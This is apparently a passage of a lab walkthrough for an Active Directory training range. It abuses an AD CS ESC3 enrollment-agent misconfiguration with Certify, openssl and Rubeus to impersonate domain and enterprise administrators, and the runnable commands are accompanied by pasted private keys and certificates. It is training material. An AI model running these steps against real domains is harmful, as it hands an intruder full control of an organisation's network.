> L1ivnkbrr9e70eThzeSmP7jKirQJScojp+gcuwjsBOBPa8y0tWLmMYl3S5hPkCQC\
> 6CDiyrf/HhJJ59+VCz3t415/HuOx6fbaCQG7gzLPo6ejIiwzj0SttMIBvBOyt0ne\
> ZHsJG9nnL/s77ooxZohUvUL0fhoyXdbsEtAd1K0IIpUodl1C0WYpSqBFmowKzqbR\
> tpnbmuTm+SPicNvrLMtC80pXKvj4toBEW/AcfK3X3VXyyZes79opcs4KpjPWh36z\
> V3t08eBwFfk=\
> \-----END CERTIFICATE-----

Like earlier, save the certificate text to `esc3.pem` and convert to pfx. Let’s keep using `SecretPass@123` as the export password:

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Now we can use the Enrollment Agent Certificate to request a certificate for DA from the template `SmartCardEnrollment-Users`:

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

Once again, save the certificate text to esc3-DA.pem and convert the pem to pfx. Still using `SecretPass@123` as the export password:

> \-----BEGIN RSA PRIVATE KEY-----\
> MIIEowIBAAKCAQEAocO59m859Dzd1yFpcKEJ9+KmS/bjlL2x/alwphJjSv/6iMno\
> JgcLiYVSQ0OC1WcxIu8HvYH+BjD7QNGCik7WyBaWSJ9lXIytVRjzpN0rlAjdBG3r\
> t2UxyMiph55Yw6I+DXU89PHkcZYdPwoc7AwQieOBaEMziPmUsITOjBoopgy1f2Ea\
> O3VF2At80Z4hJGuV5xIK503rUaL+EEEAhX8x6VlHAZv7BwXKZy27QdKSfhVKrsuM\
> 0PXjCrcvI5rYJDIOxQ1T5+Vw2wPApdOlXlGmMlQNFpQhHRRGubO1w9icXOtpcrZD\
> eCW93F1KAsDxjtTGZ8eupELoQ5/oTbTC/osXYQIDAQABAoIBAQCXDLi9EKdBFQTh\
> OWXHsdgpDA7UqDliTq/BeVKjAFCPW++Jg1+vAq0XQNLL1GJ6+ty7DhBgON4G0f4L\
> TJdkprGQLOcv8QcpIINKDv6TV6K1nIEk/a85lNij8Bu9c3LXWswurOa6opT6K34r\
> uzm+gJWA7FuODBI3OTZKjfiAgnyqb39p00lcrsX1IL8k1Pr3s+x0ucY2CAhvkuMc\
> YyI9cl+s32ClcWKsuLg+OUqXKqz6qTK2WcP1uhSRPLMc9B1O0wT9yeoYVFNOxfpr\
> nNZgm7dcvL0L4Bouf62gU5FHEsxv4ULrHUpRW3B2lnKuxygowDy447Q5Pc1oBmSH\
> vGo1nFwxAoGBANE9IEW+jzMY4TXnDeu6SeaHLogo3nSUJGOZvM5BcyjdHahZHEmI\
> 3FWbTY/GImUk1ESiwHeZb/1CRJshfVwC0AT6PkOfl1x5KvuPis3Z40ebPWBnXkXB\
> 1FLQzaa/XRdpKcMBh5mgc7j0++d1IkYiXIIIjb5W6xrybyVhATa6pp2XAoGBAMXq\
> huUe6IFWGnJD4lo1NZjIOiR8rny3MGGsfPCejcvGNXBarmll0Vox9UAL1raBIvtf\
> iiC29DWenAZOJ1kUNm65F9HXfzWmw91+d9H0s5x77if8+ypK3D1VrPmr9scNs9Eg\
> cbC5vFpEicpG1L0gs1h2t8RfrItQZ6TLzNLR/wHHAoGAIMAilwgWvfa8+YTq5uTH\
> wG+UVveeqjyt3XEo3lfcQJ8rjzgzd0cWxceDQmfO5mn3V67p1U6M+uUue+GoD4jZ\
> Ko5IxKjsNis5ERsMrN/X9VNVLgu/88c9BqFsLxdw6MMrKDzLDr7QnjiqXTY2YSfr\
> tubD2PEd55/eycj/OaPJhI0CgYAeix0aSvTS0Pjv3W4XQdLtqyjd7Kf480RyLm5x\
> q+ZyJjqlBjmYZnAynTceFTWjoLZHWO02M0Xo6HtntbP42Ve1Krd0WO921i+wBQ50\
> xnDZm36biT0xv6/Rf2Fcfp9tBL5Vbc5d2awpuh4Rq3C1Z1CGPHwLwEAel+AG3LTV\
> bDcQjQKBgByDJdrP0jSExonT64Haeh3LcW93IRDTiiL3pSQiF7vSRQQIyZUrRey/\
> 8JyA+SRIOYVDPlgnGic4N7fOm3BDkJzqb6oMGYe58Wlam+HBgqPhUwCAq+mineoF\
> KncMwhi7c1PjeFdUxJWiw7IAZH/MOwabPP2I22Tw0zaV4UtbTE9v\
> \-----END RSA PRIVATE KEY-----\
> \-----BEGIN CERTIFICATE-----\
> MIIGiTCCBXGgAwIBAgITFQAAAE57Hq7b1JF0JAAAAAAATjANBgkqhkiG9w0BAQsF\
> ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l\
> eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNjA0MTkx\
> MTI4NDJaFw0yODA0MTkxMTM4NDJaMHYxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ\
> MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh\
> cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRYwFAYDVQQDEw1BZG1pbmlzdHJhdG9yMIIB\
> IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAocO59m859Dzd1yFpcKEJ9+Km\
> S/bjlL2x/alwphJjSv/6iMnoJgcLiYVSQ0OC1WcxIu8HvYH+BjD7QNGCik7WyBaW\
> SJ9lXIytVRjzpN0rlAjdBG3rt2UxyMiph55Yw6I+DXU89PHkcZYdPwoc7AwQieOB\
> aEMziPmUsITOjBoopgy1f2EaO3VF2At80Z4hJGuV5xIK503rUaL+EEEAhX8x6VlH\
> AZv7BwXKZy27QdKSfhVKrsuM0PXjCrcvI5rYJDIOxQ1T5+Vw2wPApdOlXlGmMlQN\
> FpQhHRRGubO1w9icXOtpcrZDeCW93F1KAsDxjtTGZ8eupELoQ5/oTbTC/osXYQID\
> AQABo4IDMjCCAy4wPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jh\
> hyaCn65RgvL2fYE/hrSlX4e6+hgCAWQCAQkwKQYDVR0lBCIwIAYIKwYBBQUHAwQG\
> CisGAQQBgjcKAwQGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIHgDA1BgkrBgEEAYI3\
> FQoEKDAmMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwCgYIKwYBBQUHAwIwHQYD\
> VR0OBBYEFDjLW0KqNtIYb3eRLvz5RaBnV4nOMB8GA1UdIwQYMBaAFNH+jQqn+rQy\
> nzb8ILj3y55oxUXtMIHYBgNVHR8EgdAwgc0wgcqggceggcSGgcFsZGFwOi8vL0NO\
> PW1vbmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1tY29ycC1kYyxDTj1DRFAsQ049UHVi\
> bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv\
> bixEQz1tb25leWNvcnAsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz\
> dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF\
> BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPW1vbmV5Y29ycC1N\
> Q09SUC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049\
> U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1tb25leWNvcnAsREM9bG9jYWw/\
> Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo\
> b3JpdHkwQwYDVR0RBDwwOqA4BgorBgEEAYI3FAIDoCoMKGFkbWluaXN0cmF0b3JA\
> ZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWwwTQYJKwYBBAGCNxkCBEAwPqA8Bgor\
> BgEEAYI3GQIBoC4ELFMtMS01LTIxLTcxOTgxNTgxOS0zNzI2MzY4OTQ4LTM5MTc2\
> ODg2NDgtNTAwMA0GCSqGSIb3DQEBCwUAA4IBAQCNuMnY089cUV6elOm8O9E4ZthT\
> yuHAgzd2fWI/Li+OGSKHu+urYlA0ZogJHmF9r1LpgkGnXRzlbn878UGCZR/ne30H\
> a8+073Ug2lVAll1Reb/EfY4+kcRwPFxuhMAr0wBimkD11NQMDMSr4zm++gBNYHNE\
> eBxOgoR+x7+KT0LqUzI6sK2HMGqVH+B672+OiCeEUJ95B8HncS08pWm9pY3n8jjI\
> 09xTDPJ2caLIzfSLzmzj+kW/67ijnda9cxOkLGkuWqrQi+HAUi7/Pf6pBP/seDOC\
> Xx2TdLPDhsP84ky8wzQ+Y7fLQ5lxnTnwTQ1siPNJtynrTLrWeRHlKQsTOawq\
> \-----END CERTIFICATE-----

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
```

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

### Use Rubeus to esc3-DA created above with Rubeus to request a TGT for DA

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:SecretPass@123 /ptt
```

Check if we actually have DA privileges now:

```
winrs -r:dcorp-dc cmd /c set username
```

<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation to EA using ESC3

To escalate to Enterprise Admin, we just need to make changes to request to the **SmartCardEnrollment-Users** template and Rubeus. Please note that we are using `/onbehalfof: mcorp\administrator` here:

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

> \-----BEGIN RSA PRIVATE KEY-----\
> MIIEpAIBAAKCAQEA6C06f8Io4ZOfCIjiEmVfbdd9SoBD1uy5q31UE8SDDABiVeQV\
> DcXbVqOpaVZZpuqIWPSUg+k3HYthgxNmo2eC8VV0Zh5NYq65T8+WSCXJMlgnUAZX\
> 6Zux5HBoImYCNcCSaCfpnbJLqESir1ydroV3vJPltBSQ/T1IyXhwr0XdDt/yKt8L\
> Oo3z2Cb31TDjP6A9DI1r6N5tZj7p0xRNZoceox0t9B24msVjAWQZewMSJq2edh7M\
> qzPcW63k0G1vsYAC06w4aiCo+PinByIoZHAWFCXyQm8XQD6nyOcabcBxEadv9JtV\
> /VKELRVXGVj+LhieljUBXR7UwdANFADDl93HHQIDAQABAoIBAGGBVRcAcHDDsT9B\
> VUgKgLg9jmWyVks1oYgOmzeuCKcKpkGSBvGAzWumUehmFkKOLnLFTHXVhIsI1Qva\
> Ivmu6AP4MmkMgs1VuYd2E5P7InLdKK1n7JW0CFJ6jpEbrAPs+s95K5hJn5JsOLJS\
> v/niHXX52rb1CCsCCMZrqU9ClOLAh0gstSrh8ePW9H5/JMi5HK4U9CTNzB9EgbR5\
> HZY00psBDaKLPpk4UAVFePjaWc/MSDWwCQ+5PDGtgSc4Elduyf/1LIkpMWMuJREd\
> yb/Zy3UzYiQby1LmR8KFRZ7fgxzRm4LiukziN9URnxQZNOj3juFE+bM88UyoziHq\
> 0Zv3i3UCgYEA9enephdX/Jun53rwsAbiuR3/dSZPiJlxSv3ZK3+Ol0UNeObDgYoJ\
> iOZ2sEJXm866jzitdQ4Xk1LODRYJscEgn1gAFgmI6G8TY6mMOsJoEKRYsmrs9l9A\
> /dhViuVomeWj7FcRpXeAYYcgD1US9rp8xM0tONkRVDyHSLzMpNvxrC8CgYEA8bMe\
> kxvCaIwBYaau2uzvgZOqYJeywqK8oJAroGgIMaXtLMEl21AaveErw8ah+ACgu8n2\
> 9ToHuIojNFDfmjB3e/nOTX69qL4PyVR2YSPV2zyZeaBVYpYQLTYDC28bgMc8kxj0\
> aTtXJZDzmG4mafNsTciV1Us5nPe+xk5IuhPH8nMCgYEA6vbh2Tr2xBOKM8AhF2AM\
> 46nI+4t2dON//5JbHZfMi7bb74g2h6B4CcmC4FkTUnkNgmk6O10So5576L8E1kXc\
> wMOZmXTUzpnLIe/PYBl+y1/sq9VEwwcylxlMauFVt65WmSx8XOi4zvcIZ/32l66K\
> JpSQv/+P8je/X32d32uUF9sCgYEAsAzAIHb/zBbuiqpWgrBCZCei2miklJDkxC8/\
> F7+u+Drb3tVxNaXLVLNGpXtxTqtmaGJbt5NlPE2iBuFBfZX/8hWq51eB3f9SkFst\
> PuRTSTWCtMzMZNrZPZUx8oojhlGZFav/mwbWG07RoB3bbSEZqi6ItKvucx8hnmA3\
> KRJveXECgYBjFaTOv1KbOqD+FSdG1yeLan7h+ndmXTsSLp+tsRsz3C+HX+VuhPxU\
> 9D3BoUOKlgGh7rrE+jXKcaWPCVhRqO+Lf5QGeFLn8MmKO/nOVRtv+UMVb3GXphgC\
> WLs3wdn/NmTiD6vh8pEHNn+YEjxne2nAkqZaNvLCJXvSlkrvVaAGSg==\
> \-----END RSA PRIVATE KEY-----\
> \-----BEGIN CERTIFICATE-----\
> MIIGYTCCBUmgAwIBAgITFQAAAE/txYdRb9A17gAAAAAATzANBgkqhkiG9w0BAQsF\
> ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l\
> eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNjA0MTkx\
> MTM1MTVaFw0yODA0MTkxMTQ1MTVaMFoxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ\
> MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEOMAwGA1UEAxMFVXNlcnMxFjAUBgNV\
> BAMTDUFkbWluaXN0cmF0b3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB\
> AQDoLTp/wijhk58IiOISZV9t131KgEPW7LmrfVQTxIMMAGJV5BUNxdtWo6lpVlmm\
> 6ohY9JSD6Tcdi2GDE2ajZ4LxVXRmHk1irrlPz5ZIJckyWCdQBlfpm7HkcGgiZgI1\
> wJJoJ+mdskuoRKKvXJ2uhXe8k+W0FJD9PUjJeHCvRd0O3/Iq3ws6jfPYJvfVMOM/\
> oD0MjWvo3m1mPunTFE1mhx6jHS30HbiaxWMBZBl7AxImrZ52HsyrM9xbreTQbW+x\
> gALTrDhqIKj4+KcHIihkcBYUJfJCbxdAPqfI5xptwHERp2/0m1X9UoQtFVcZWP4u\
> GJ6WNQFdHtTB0A0UAMOX3ccdAgMBAAGjggMmMIIDIjA9BgkrBgEEAYI3FQcEMDAu\
> BiYrBgEEAYI3FQiF4ahyh8yfaOGHJoKfrlGC8vZ9gT+GtKVfh7r6GAIBZAIBCTAp\
> BgNVHSUEIjAgBggrBgEFBQcDBAYKKwYBBAGCNwoDBAYIKwYBBQUHAwIwDgYDVR0P\
> AQH/BAQDAgeAMDUGCSsGAQQBgjcVCgQoMCYwCgYIKwYBBQUHAwQwDAYKKwYBBAGC\
> NwoDBDAKBggrBgEFBQcDAjAdBgNVHQ4EFgQUC5qRV1nArnbI6dIalvHPDVvxMLYw\
> HwYDVR0jBBgwFoAU0f6NCqf6tDKfNvwguPfLnmjFRe0wgdgGA1UdHwSB0DCBzTCB\
> yqCBx6CBxIaBwWxkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURDLUNBLENOPW1j\
> b3JwLWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2\
> aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1vbmV5Y29ycCxEQz1sb2NhbD9jZXJ0\
> aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp\
> YnV0aW9uUG9pbnQwgcsGCCsGAQUFBwEBBIG+MIG7MIG4BggrBgEFBQcwAoaBq2xk\
> YXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURDLUNBLENOPUFJQSxDTj1QdWJsaWMl\
> MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD\
> PW1vbmV5Y29ycCxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xh\
> c3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA4BgNVHREEMTAvoC0GCisGAQQBgjcU\
> AgOgHwwdYWRtaW5pc3RyYXRvckBtb25leWNvcnAubG9jYWwwTAYJKwYBBAGCNxkC\
> BD8wPaA7BgorBgEEAYI3GQIBoC0EK1MtMS01LTIxLTMzNTYwNjEyMi05NjA5MTI4\
> NjktMzI3OTk1MzkxNC01MDAwDQYJKoZIhvcNAQELBQADggEBAEaiULTmjGHWW/Fs\
> lHYajYsmo/k8zqcMDAGCAOmidyXJrAvyzxHYIYNqc28gsMOH3WM8VHS0sxrAJqY+\
> bZOJUgRsEGrpo1ysqBfk2uF26zoMXAnVhvYAXDCgZhl4dnwhAdxTtr9Ou/uHt8Zl\
> ez01uaNZsBr6Vw4AaxzIw+BwPHfkpTsHzldgO+fVGMIQjwVjWUH00NhwpNunYOnK\
> uBL+hJq46Dn9spXQHBoDC0Eft+k4Z318BB99T158jPGwxIyWR5gGRPj+THSGVrJ2\
> 7+Avbt1FjNT+JEY4NK7R7OgfxHsHeQDV6vLfs1Ufm6KZvvGz5HYLTtX/zxcpaQ04\
> 0pwCS04=\
> \-----END CERTIFICATE-----

Convert the pem to esc3-EA.pfx using openssl using `SecretPass@123` and use the pfx with Rubeus:

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-EA.pfx
```

<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

### Use Rubeus to esc3-EA

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```

Finally, access mcorp-dc!

```
winrs -r:mcorp-dc cmd /c set username
```

<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
